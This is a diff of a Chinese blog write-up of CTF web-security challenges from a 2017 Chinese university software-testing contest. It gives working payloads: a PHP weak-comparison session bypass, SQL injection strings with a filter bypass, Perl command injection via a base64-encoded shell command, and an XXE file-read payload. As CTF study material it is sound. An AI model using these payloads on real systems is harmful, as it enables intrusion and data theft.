@@ -1,15 +1,19 @@
 ---
-title: 2017 慕测安恒杯部分题 WriteUp
+title: 2017 全国大学生软件测试大赛web安全赛预赛 WriteUp
 tags:
   - CTF
   - WriteUp
   - 文件包含
   - 编辑器泄露
-date: 2017-10-12 20:20:13
+date: 2017-10-23 20:20:13
 ---
 
-6月18日的线上赛，今天才补上wp，9月22日更新babysql，10月12日更新findpwd、服务发现
+其实就是慕测安恒杯
+6月18日的夏季预赛线上赛，9月22日更新babysql，10月12日更新findpwd、服务发现、babylogin
+10月23更新秋季预赛题目
 <!-- more -->
+
+# 夏季预赛
 
 ## 根据ip查dns解析记录
 
@@ -166,3 +170,118 @@ grant all privileges on fuckbean.* to fuckbean@localhost identified by 'fuckbean
 a'union select 1,2,3,0xxxxxxx-- a@qq.com
 ```
 其中`0xxxxxxx`是你自己的邮箱的hex，提交后收到flag邮件
+
+## babylogin
+题目给了源代码，关键语句如下
+```php
+...
+
+foreach (array('_GET','_POST','_COOKIE') as $key) {
+    foreach ($$key as $key2 => $value) {
+        $_GPC[$key2]=$value;
+    }
+...
+...
+
+$session = json_decode(base64_decode($_GPC['__session']), true);
+    if (is_array($session)){
+        $user = find_user_by_uid($session['uid']);
+        if(is_array($user) && $session['hash'] == $user['password']){
+            $_SESSION["login"]=1;
+            $_SESSION["userin"]=$userin;
+            header("Location: admin.php");
+            exit();
+        }else{
+            echo "用户名或密码错误";
+        }
+    }
+
+}
+```
+
+可以看出`session`可控，而且存在`==`弱类型,`True=="xxxxxxx"` 恒成立
+用如下代码构造payload
+```php
+$session['uid']=1;
+$session['hash']=True;
+
+echo base64_encode(json_encode($session));
+```
+最后抓登陆的包，加一个参数`__session`值为`eyJ1aWQiOjEsImhhc2giOnRydWV9`就能跳转到`admin.php`
+
+## php的锅
+改天写好了
+
+
+
+# 秋季预赛
+
+## 都是php就不好玩了呀 
+题目地址： http://118.178.18.181:57016/index.pl?file=test.txt
+perl写的，直接读取`index.pl`就能拿到flag
+```
+http://118.178.18.181:57016/index.pl?file=index.pl
+```
+
+## 查询ip
+夏季预赛的题，直接nslookup
+```bash
+C:\Users\xxxxxx>nslookup 107.182.177.34
+服务器:  UnKnown
+Address:  172.16.0.1
+
+名称:    this-is-flag
+Address:  107.182.177.34
+```
+
+## mac就是好用
+题目地址： http://118.178.18.181:57013/
+下载`http://118.178.18.181:57013/.DS_store`,cat一下，发现`s h o w m e f l a g . p h p`字样
+访问
+```
+http://118.178.18.181:57013/showmeflag.php
+```
+拿到flag
+
+## 人，才是最大的漏洞
+题目地址： http://114.55.36.69:57012/
+经典登录框注入，构造
+```
+username=1'union select md5(1)#
+password=1
+```
+拿到flag
+
+## sqlmap没有卵用 
+题目地址： http://118.178.18.181:57019/
+右键源代码提示`source.php`,union和from前面只能存在字母，不能有空格，构造`\N`绕过，(我也不知道为啥只有`\N`可以，小写n的不行)
+```sql
+\Nunion select 1,flag, \Nfrom flag%23 
+ // \N表示回车，在Linux中表示一行的结束。
+ ```
+
+## 都是php就不好玩了呀
+题目地址： http://118.178.18.181:57016/index.pl?file=test.txt
+构造代码注入，这里要把含有flag的用base64编码
+```
+http://118.178.18.181:57016/index.pl?file=test.txt| `echo Y2F0IC92YXIvd3d3L2h0bWwvZmxhZy5wbA==| base64 -d`|
+```
+
+## can u read me,do u understand me?
+题目地址： http://114.55.36.69:57018/
+XXE,直接读取flag.php，读取出来的源码是phpjiami过的，可以去花钱解也可以直接用工具解
+```
+<!DOCTYPE xdsec[
+<!ELEMENT methodname ANY>
+<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">]>
+<user><name>&file;</name></user>
+```
+
+## 还记得找回密码的功能嘛
+题目地址： http://114.55.36.69:57014/
+给了源码
+payload
+```
+'union select 1,2,3,4 -- yourqq@qq.com
+```
+这里主要是利用了空格会被分割成多个收件人
